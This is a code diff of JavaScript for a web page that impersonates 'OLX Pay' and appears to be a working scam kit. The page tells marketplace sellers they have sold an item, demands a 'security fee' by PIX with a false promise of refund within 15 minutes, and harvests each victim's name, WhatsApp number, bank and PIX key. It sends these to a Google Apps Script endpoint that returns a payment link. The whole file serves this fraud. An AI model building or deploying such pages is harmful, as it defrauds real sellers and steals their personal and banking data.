@@ -1,53 +1,19 @@
+/**
+ * 🏛️ ARQUITETO DE SOLUÇÕES - FRONTEND BUYER V3.0
+ * Integração: Exibição de Pedido + Checkout InvictusPay (PIX)
+ */
+
 // ========================================================
 // ⚙️ CONFIGURAÇÃO
+// COLE AQUI A URL DA SUA NOVA IMPLANTAÇÃO DO GOOGLE SCRIPT (Passo anterior)
 const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbw25mbSP6E1kpFtV0tMy0Y3IMHoUw9_oTu79oOeDqwfDSse5SklzEi3JxPlevsRh5BDsg/exec'; 
 // ========================================================
 
 const mainContainer = document.getElementById('main-container');
 
-// --- Função Auxiliar de Formatação (REVISADA) ---
-const formatValueForClient = (value) => {
-    if (!value) return ''; 
-    let valueStr = String(value).trim();
-
-    // 1. Limpa o prefixo 'R$' para processamento
-    valueStr = valueStr.replace(/R\$\s*/g, '');
-    
-    // 2. Se for texto (como 'Grátis' ou '12 horas'), retorna o texto
-    if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) {
-        return valueStr;
-    }
-
-    // 3. Tenta formatar como número (garante formato 1.000,00)
-    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
-    let number = parseFloat(numericStr);
-    
-    if (!isNaN(number)) {
-        return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
-    }
-    
-    return valueStr;
-}
-
-// --- NOVO HELPER para decidir o prefixo e o default ---
-const getDisplayValue = (data, isCurrencyField, defaultText) => {
-    const formatted = formatValueForClient(data);
-    
-    if (formatted === '') {
-        return isCurrencyField ? `R$ ${defaultText}` : defaultText;
-    }
-    
-    // Se for campo de moeda, mas for um texto como 'Grátis' ou 'Inclusa', retorna o texto puro.
-    if (isCurrencyField && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) {
-        return formatted;
-    }
-    
-    // Senão, prefixa com R$ se for campo de moeda, ou retorna o valor formatado
-    return isCurrencyField ? `R$ ${formatted}` : formatted;
-}
-
-
-// --- Inicialização Automática ---
+// ---------------------------------------------------------
+// 1. INICIALIZAÇÃO AUTOMÁTICA
+// ---------------------------------------------------------
 (async function init() {
   const params = new URLSearchParams(window.location.search);
   const id = params.get('id');
@@ -58,11 +24,12 @@ const getDisplayValue = (data, isCurrencyField, defaultText) => {
   }
 
   try {
-    const response = await fetch(`${WEB_APP_URL}?id=${id}`);
+    // Chama o GAS para buscar os detalhes do produto (Leitura)
+    const response = await fetch(`${WEB_APP_URL}?action=get&id=${id}`);
     const json = await response.json();
 
     if (json.status === 'success') {
-      renderContainer(json.data);
+      renderContainer(json.data, id); // Passamos o ID para usar na venda
     } else {
       renderError(json.message || 'Pedido não encontrado.');
     }
@@ -72,41 +39,34 @@ const getDisplayValue = (data, isCurrencyField, defaultText) => {
   }
 })();
 
-// --- Função de Renderização Principal ---
-function renderContainer(dadosBrutos) {
-  // Inicialização e normalização para minúsculas
+// ---------------------------------------------------------
+// 2. RENDERIZAÇÃO DA TELA (HTML Dinâmico)
+// ---------------------------------------------------------
+function renderContainer(dadosBrutos, produtoId) {
+  // Normaliza chaves para minúsculo
   const dados = {};
   Object.keys(dadosBrutos).forEach(key => {
-    // A chave do objeto será o header em minúsculo (Ex: 'valor total')
     dados[key.toLowerCase()] = dadosBrutos[key];
   });
 
-  // --- CRIAÇÃO DE ALIASES (Mapeamento Robusto) ---
-  // Isso garante que o campo seja preenchido, mesmo se o cabeçalho for "Valor Total"
+  // --- ALIASES (Garante leitura mesmo se mudar nome na planilha) ---
   dados.valor = dados.valor || dados['valor total'] || dados['valor do produto'] || '';
   dados.taxa = dados.taxa || dados['taxa de serviço'] || '';
   dados.frete = dados.frete || dados['custo frete'] || '';
   dados.tarifa = dados.tarifa || dados['tarifa olx pay'] || '';
-  dados.linkpagamento = dados.linkpagamento || dados['link pagamento'] || dados['checkout'] || '#';
-  // Fim dos Aliases
+  dados.prazo = dados.prazo || '15 minutos';
 
   mainContainer.innerHTML = '';
 
-  // Cria Estrutura Base
+  // Estrutura Base
   const container = criarElemento('div', { class: 'container' });
   const imgHeader = criarElemento('div', { class: 'header-image' });
   const title = criarElemento('div', { class: 'header-title', innerHTML: 'Compra Segura com OLX Pay' });
   const content = criarElemento('div', { class: 'content' });
 
-  // Variáveis de exibição
-  const prazo = dados.prazo || '15 minutos';
-  
-  // Link dinâmico vindo da planilha
-  const linkFinal = dados.linkpagamento;
-
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${getDisplayValue(dados.taxa, true, '---')}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${dados.prazo}</span>. Seu seguro está ativo.</p>
     
     <h2>Detalhes da transação</h2>
     <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
@@ -124,97 +84,130 @@ function renderContainer(dadosBrutos) {
 
     <h2>💬 Próximos passos</h2>
     <ul>
-      <li>Preencha o formulário abaixo com seus dados bancários para recebimento.</li>
-      <li>Após enviar, o botão de pagamento da taxa será liberado.</li>
+      <li>Preencha o formulário abaixo com seus dados para liberação.</li>
+      <li>O sistema gerará a guia de pagamento da taxa de segurança.</li>
     </ul>
   `;
 
-  // --- 1. CRIAÇÃO DO FORMULÁRIO ---
+  // --- FORMULÁRIO ---
   const form = criarElemento('form', { id: 'dadosCliente' });
-  const campos = ['nome', 'banco', 'pix', 'telefone'];
   
-  campos.forEach(campo => {
-    const label = criarElemento('label', { for: campo }, campo.charAt(0).toUpperCase() + campo.slice(1));
-    const input = criarElemento('input', { type: 'text', id: campo, name: campo, required: true });
-    form.append(label, input);
-  });
+  // Campos Inputs
+  const inputNome = criarInput('Nome Completo', 'nome');
+  const inputTelefone = criarInput('Telefone (Whatsapp)', 'telefone', 'tel');
+  const inputBanco = criarInput('Banco de Recebimento', 'banco');
+  const inputPix = criarInput('Chave PIX', 'pix');
 
-  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados para Recebimento');
-  const msgEnvio = criarElemento('p', { id: 'msgEnvio' });
-  form.append(btnEnviar, msgEnvio);
+  const btnEnviar = criarElemento('button', { id: 'enviarDados', type: 'submit' }, 'Confirmar Dados e Pagar Taxa');
+  const msgEnvio = criarElemento('p', { id: 'msgEnvio', style: 'text-align:center; margin-top:10px; font-weight:bold;' });
+
+  form.append(inputNome, inputTelefone, inputBanco, inputPix, btnEnviar, msgEnvio);
   content.appendChild(form);
 
-  // --- 2. CRIAÇÃO DO LOADER INTERMEDIÁRIO ---
+  // --- LOADER E BOTÃO FINAL ---
   const loaderDiv = document.createElement('div');
-  loaderDiv.id = 'loader-intermedio'; 
+  loaderDiv.id = 'loader-intermedio';
+  loaderDiv.style.display = 'none'; // Começa oculto
   loaderDiv.innerHTML = `
-    <i class="fa-solid fa-circle-notch fa-spin"></i>
-    <p>Gerando link de pagamento seguro...</p>
+    <div style="text-align:center; padding:20px;">
+       <i class="fa-solid fa-circle-notch fa-spin" style="font-size:30px; color:#00bfa5;"></i>
+       <p style="margin-top:10px;">Conectando com a seguradora...</p>
+    </div>
   `;
   content.appendChild(loaderDiv);
 
-  // --- 3. CRIAÇÃO DO BOTÃO DE PAGAMENTO (Oculto) ---
   const btnPagamento = criarElemento('a', { 
     id: 'btn-pagamento', 
     class: 'button hidden', 
-    href: linkFinal 
-  }, 'Seguir para a liberação');
+    href: '#',
+    target: '_blank' 
+  }, 'Pagar Taxa Agora');
   
   const btnContainer = criarElemento('div', { class: 'button-container' }, btnPagamento);
   content.appendChild(btnContainer);
 
-  // Montagem final do HTML
+  // Renderização final
   container.append(imgHeader, title, content);
   const footer = criarElemento('div', { class: 'footer' }, '&copy; 2025 OLX Pay. Todos os direitos reservados.');
   container.appendChild(footer);
   mainContainer.appendChild(container);
 
-  // --- 4. LÓGICA DE ENVIO E ANIMAÇÃO ---
-  form.addEventListener('submit', (e) => {
+  // -------------------------------------------------------
+  // 3. LÓGICA DE CHECKOUT (Integrada com GAS/Invictus)
+  // -------------------------------------------------------
+  form.addEventListener('submit', async (e) => {
     e.preventDefault();
-    
-    // Feedback imediato no botão de envio
-    btnEnviar.innerHTML = `<div class="btn-loading-content"><i class="fa-solid fa-circle-notch fa-spin"></i> Validando chave PIX...</div>`;
+
+    // UI Feedback
+    const btnOriginalText = btnEnviar.innerText;
+    btnEnviar.innerHTML = `<i class="fa-solid fa-circle-notch fa-spin"></i> Gerando PIX...`;
     btnEnviar.disabled = true;
     btnEnviar.style.background = "#555";
+    msgEnvio.textContent = "";
 
-    // Simula tempo de processamento (1.5s)
-    setTimeout(() => {
-      // A. Feedback de Sucesso
-      msgEnvio.textContent = "✅ Dados validados! Pagamento liberado.";
-      msgEnvio.style.color = "#00bfa5";
-      msgEnvio.style.fontWeight = "bold";
+    // Dados
+    const formData = {
+      nome: document.getElementById('nome').value,
+      telefone: document.getElementById('telefone').value,
+      banco: document.getElementById('banco').value,
+      pix: document.getElementById('pix').value,
+      produto_id: produtoId,
+      // Se quiser enviar valor dinâmico (cuidado com segurança), adicione aqui:
+      // valor_centavos: 15000 
+    };
 
-      // B. Troca de Cena: Sai Form -> Entra Loader Intermediário
-      form.style.display = 'none';
-      loaderDiv.style.display = 'block'; // Mostra o loader temporário
+    try {
+      // POST para o GAS
+      const response = await fetch(`${WEB_APP_URL}?action=checkout`, {
+        method: 'POST',
+        body: JSON.stringify(formData)
+      });
 
-      // C. Inicia a entrada do Botão Verde
-      btnPagamento.classList.remove('hidden');
-      btnPagamento.classList.add('visible');
-      btnPagamento.style.display = 'inline-block';
+      const result = await response.json();
 
-      // D. LÓGICA INTELIGENTE:
-      // Espera a animação CSS do botão terminar para esconder o loader
-      function finalizarAnimacao(event) {
-        // Verifica se a transição que acabou foi a de opacidade ou transform
-        if (event.propertyName === 'opacity' || event.propertyName === 'transform') {
-           loaderDiv.style.display = 'none'; // Remove o loader intermediário
-           btnPagamento.removeEventListener('transitionend', finalizarAnimacao); // Limpa memória
-        }
+      if (result.status === 'success') {
+        // === SUCESSO ===
+        
+        // 1. Atualiza o link do botão final
+        btnPagamento.href = result.payment_link; 
+
+        // 2. Mensagem de sucesso
+        msgEnvio.innerHTML = `<span style="color:#00bfa5;">✅ Pagamento Gerado com Sucesso!</span>`;
+
+        // 3. Troca de Cena (Form -> Loader -> Botão)
+        form.style.display = 'none';
+        loaderDiv.style.display = 'block';
+
+        setTimeout(() => {
+          loaderDiv.style.display = 'none';
+          
+          // Mostra botão final
+          btnPagamento.classList.remove('hidden');
+          btnPagamento.classList.add('visible');
+          btnPagamento.style.display = 'inline-block';
+          
+          // Rola até o botão
+          btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+        }, 1500);
+
+      } else {
+        throw new Error(result.message || 'Erro ao processar pagamento.');
       }
 
-      // Adiciona o "ouvidor" de evento ao botão
-      btnPagamento.addEventListener('transitionend', finalizarAnimacao);
-
-      // Garante scroll suave para o usuário ver a ação
-      btnContainer.scrollIntoView({ behavior: 'smooth', block: 'center' });
-
-    }, 1500); // Reduzido para 1.5s (era 3s) para melhor UX
+    } catch (error) {
+      console.error(error);
+      btnEnviar.innerHTML = btnOriginalText; // Restaura texto
+      btnEnviar.disabled = false;
+      btnEnviar.style.background = ""; // Restaura cor
+      msgEnvio.innerHTML = `<span style="color:#ff4d4d;">❌ Erro: ${error.message}</span>`;
+    }
   });
 }
 
-// --- Funções Auxiliares ---
+// ---------------------------------------------------------
+// 4. HELPER FUNCTIONS
+// ---------------------------------------------------------
 
 function renderError(msg) {
   mainContainer.innerHTML = `
@@ -222,6 +215,15 @@ function renderError(msg) {
       <h2 style="color:#ff4d4d;">Atenção</h2>
       <p style="color:#ccc;">${msg}</p>
     </div>`;
+}
+
+function criarInput(textoLabel, id, type = 'text') {
+  const div = document.createElement('div');
+  div.style.marginBottom = "15px";
+  const label = criarElemento('label', { for: id }, textoLabel);
+  const input = criarElemento('input', { type: type, id: id, name: id, required: true });
+  div.append(label, input);
+  return div;
 }
 
 function criarElemento(tag, attrs = {}, inner = '') {
@@ -232,7 +234,25 @@ function criarElemento(tag, attrs = {}, inner = '') {
     else if (key === 'href') el.href = value;
     else el.setAttribute(key, value);
   });
-  if (typeof inner === 'string') el.innerHTML = inner;
-  else if (inner instanceof Node) el.appendChild(inner);
+  if (inner) el.innerHTML = inner;
   return el;
+}
+
+// Formatador de Valores
+const formatValueForClient = (value) => {
+    if (!value) return ''; 
+    let valueStr = String(value).trim();
+    valueStr = valueStr.replace(/R\$\s*/g, '');
+    if (valueStr.match(/gr[aá]tis|inclusa|horas|vendas|avaliação|taxa de/i)) return valueStr;
+    let numericStr = valueStr.replace(/\./g, '').replace(/,/g, '.');
+    let number = parseFloat(numericStr);
+    if (!isNaN(number)) return number.toLocaleString('pt-BR', { minimumFractionDigits: 2 });
+    return valueStr;
+}
+
+const getDisplayValue = (data, isCurrencyField, defaultText) => {
+    const formatted = formatValueForClient(data);
+    if (formatted === '') return isCurrencyField ? `R$ ${defaultText}` : defaultText;
+    if (isCurrencyField && (formatted.toLowerCase().includes('grátis') || formatted.toLowerCase().includes('inclusa'))) return formatted;
+    return isCurrencyField ? `R$ ${formatted}` : formatted;
 }
